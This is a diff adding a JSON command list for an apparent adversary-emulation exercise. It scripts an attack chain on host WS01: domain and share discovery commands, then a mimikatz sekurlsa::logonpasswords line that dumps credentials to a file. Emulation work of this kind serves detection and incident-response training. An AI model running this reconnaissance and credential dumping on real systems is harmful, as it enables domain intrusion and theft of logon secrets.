@@ -1,0 +1,17 @@
+{
+  "name": "c0015-phase2",
+  "description": "Operator-phase kill chain for session 1 (WS01): identity check -> the exact DFIR discovery set -> share probe -> credential-access simulation (Mimikatz-shaped LSASS surrogate) -> staging noise. Lateral (WMI) and session 2 stay operator-interactive because they require the explicit it.admin credential (prompt/runas only).",
+  "entries": [
+    { "cmd": "whoami /all", "pause": 2 },
+    { "cmd": "net view /all", "pause": 2 },
+    { "cmd": "tasklist /s localhost", "pause": 2 },
+    { "cmd": "net group \"domain admins\" /dom", "pause": 2 },
+    { "cmd": "net localgroup \"administrator\"", "pause": 2 },
+    { "cmd": "nltest /domain_trusts /all_trusts", "pause": 2 },
+    { "cmd": "net view /all /domain", "pause": 2 },
+    { "cmd": "net view /all time", "pause": 2 },
+    { "cmd": "ping -n 1 FS01", "pause": 3 },
+    { "cmd": "net view \\\\FS01", "pause": 2 },
+    { "cmd": "C:\\Tools\\mimikatz.exe sekurlsa::logonpasswords /out:C:\\C0015\\lsass.dmp", "pause": 5 }
+  ]
+}
